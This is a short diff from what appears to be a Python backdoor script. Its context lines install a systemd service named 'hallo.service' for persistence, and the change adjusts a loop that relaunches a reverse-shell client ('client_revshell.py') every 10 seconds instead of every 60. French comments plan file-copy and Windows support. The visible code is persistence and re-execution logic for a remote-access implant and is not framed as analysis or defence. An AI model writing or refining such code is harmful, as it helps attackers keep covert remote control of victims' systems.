@@ -25,9 +25,9 @@ else:
         WantedBy=multi-user.target''')
         os.system("systemctl enable --now hallo.service")
     
-while True:
-    subprocess.call("python3 client_revshell.py", shell=True)
-    time.sleep(60)
+    while True:
+        subprocess.call("python3 client_revshell.py", shell=True)
+        time.sleep(10)
 
 # ajouter un copier/coller du fichier
 # ajouter support windows
